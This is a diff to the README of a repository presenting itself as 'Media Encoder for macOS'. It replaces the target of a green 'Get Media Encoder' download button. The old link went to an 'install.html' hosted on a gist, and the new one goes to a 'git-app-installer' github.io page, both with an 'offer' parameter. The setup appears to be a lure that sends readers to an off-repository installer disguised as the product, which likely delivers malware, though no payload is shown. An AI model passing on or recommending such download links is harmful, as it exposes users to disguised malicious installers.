@@ -2,7 +2,7 @@
 
 Media Encoder for macOS is a desktop utility designed to manage, convert, and optimize media files efficiently across various formats and workflows.
 
-<a href="https://gistcdn.githack.com/temptationyard487/890fb788705d11e34a257038808d6631/raw/f19e39b0cffe40320fb0d5cacc1cd86c798c542e/install.html?offer=Media%20Encoder" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MediaEncoder" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Media%20Encoder%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="340" 
